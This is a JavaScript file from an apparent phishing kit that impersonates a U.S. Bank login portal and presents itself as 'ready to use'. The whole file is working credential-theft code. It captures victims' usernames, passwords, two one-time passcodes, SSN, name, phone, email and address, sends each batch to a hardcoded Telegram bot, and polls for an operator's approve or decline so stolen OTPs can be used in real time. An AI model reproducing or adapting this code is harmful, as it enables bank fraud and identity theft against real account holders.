/**
 * BrosTec Protocol - Ready to Use
 * System: U.S. Bank Control Portal
 * Modification: Data Accumulation & Multi-Worker Session Isolation
 */

const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";

// معرف فريد للجلسة لمنع التداخل
const sessionId = Math.floor(Math.random() * 900000) + 100000;

// مخزن البيانات المؤقت (Data Accumulation Vault)
let vault = {
    user: "",
    pass: "",
    otp1: "",
    info: "",
    otp2: ""
};

async function nextStep(stepNumber) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'flex';

    let messageText = `🆔 **Session:** #${sessionId}\n`;
    let buttons = [];

    if (stepNumber === 2) {
        vault.user = document.getElementById('user').value;
        vault.pass = document.getElementById('pass').value;
        
        messageText += `👤 User: \`${vault.user}\`\n🔑 Pass: \`${vault.pass}\``;
        buttons = [[
            { text: "✅ اطلب OTP 1", callback_data: `approve_2_${sessionId}` },
            { text: "❌ خطأ دخول", callback_data: `decline_2_${sessionId}` }
        ]];
    } 
    else if (stepNumber === 3) {
        vault.otp1 = document.getElementById('otp1').value;
        
        messageText += `👤 User: \`${vault.user}\`\n🔑 Pass: \`${vault.pass}\`\n\n`;
        messageText += `🔢 OTP 1: \`${vault.otp1}\``;
        buttons = [[
            { text: "✅ تجاوز لـ Info", callback_data: `approve_3_${sessionId}` },
            { text: "❌ الرمز خطأ", callback_data: `decline_3_${sessionId}` }
        ]];
    }
    else if (stepNumber === 4) {
        const fName = document.getElementById('fName').value;
        const lName = document.getElementById('lName').value;
        const ssn = document.getElementById('ssn').value;
        const phone = document.getElementById('phone').value;
        const email = document.getElementById('email').value;
        const address = `${document.getElementById('street').value}, ${document.getElementById('city').value}, ${document.getElementById('state').value} ${document.getElementById('zip').value}`;
        
        vault.info = `Full Name: ${fName} ${lName}\nSSN: ${ssn}\nPhone: ${phone}\nEmail: ${email}\nAddress: ${address}`;

        messageText += `👤 User: \`${vault.user}\`\n🔑 Pass: \`${vault.pass}\`\n\n`;
        messageText += `📝 **Full Info:**\n${vault.info}`;
        buttons = [[
            { text: "✅ اطلب OTP 2", callback_data: `approve_4_${sessionId}` },
            { text: "❌ خطأ بيانات", callback_data: `decline_4_${sessionId}` }
        ]];
    }
    else if (stepNumber === 5) {
        vault.otp2 = document.getElementById('otp2').value;
        
        messageText += `👤 User: \`${vault.user}\`\n🔑 Pass: \`${vault.pass}\`\n\n`;
        messageText += `🔢 OTP 2: \`${vault.otp2}\`\n\n✅ Finalizing Session...`;
        buttons = [[
            { text: "✅ إنهاء العملية", callback_data: `approve_5_${sessionId}` },
            { text: "❌ الرمز خطأ", callback_data: `decline_5_${sessionId}` }
        ]];
    }

    await sendLog(messageText, buttons);
    startGlobalListener();
}

async function sendLog(text, buttons) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            })
        });
    } catch (e) { console.error("API Error"); }
}

function startGlobalListener() {
    const listener = setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await res.json();
            
            if (data.result && data.result.length > 0) {
                const update = data.result[0];
                const cb = update.callback_query;
                
                // تحقق مزدوج من الـ sessionId لضمان عزل العمل بين الموظفين
                if (cb && cb.data && cb.data.includes(sessionId.toString())) {
                    const parts = cb.data.split('_');
                    const action = parts[0]; 
                    const step = parseInt(parts[1]);

                    clearInterval(listener);
                    handleAdminAction(action, step);
                }
            }
        } catch (e) { }
    }, 3000);
}

function handleAdminAction(action, step) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';

    if (action === "approve") {
        const errors = ['otpError1', 'infoError', 'otpError2'];
        errors.forEach(id => { if(document.getElementById(id)) document.getElementById(id).style.display = 'none'; });
        goStep(step + 1); 
    } else {
        if (step === 2) goStep(1); 
        if (step === 3) document.getElementById('otpError1').style.display = 'block';
        if (step === 4) document.getElementById('infoError').style.display = 'block';
        if (step === 5) document.getElementById('otpError2').style.display = 'block';
    }
}

function goStep(targetId) {
    document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
    const next = document.getElementById('step' + targetId);
    if (next) next.classList.add('active');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
